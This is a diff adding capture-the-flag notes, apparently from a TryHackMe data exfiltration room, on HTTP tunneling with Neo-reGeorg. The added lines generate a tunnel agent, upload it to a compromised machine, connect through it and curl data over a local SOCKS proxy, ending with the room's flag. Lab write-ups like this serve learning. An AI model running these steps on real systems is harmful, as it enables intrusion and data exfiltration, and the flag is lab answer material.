@@ -61,4 +61,16 @@ Exfiltrate using HTTPS
 
 HTTP Tunneling
 -using Neo-reGeorg tool to establish communication channel to access internal network devices
+-tunneling server - on attacker machine
+-tunneling agent - uploaded to the compromised machine
+
+cd /opt/Neo-reGeorg
+python3 neoreg.py generate -k thm
+-use tunnel.php
+-upload to compromised machine
+-pass: admin
+python3 neoreg.py -k thm -u http://[IP]/uploader/files/tunnel.php
+-exfiltrate data
+curl --sock5 127.0.0.1:1080 http://[IP]/flag
+*THM{H77p_7unn3l1n9_l1k3_l337}
 
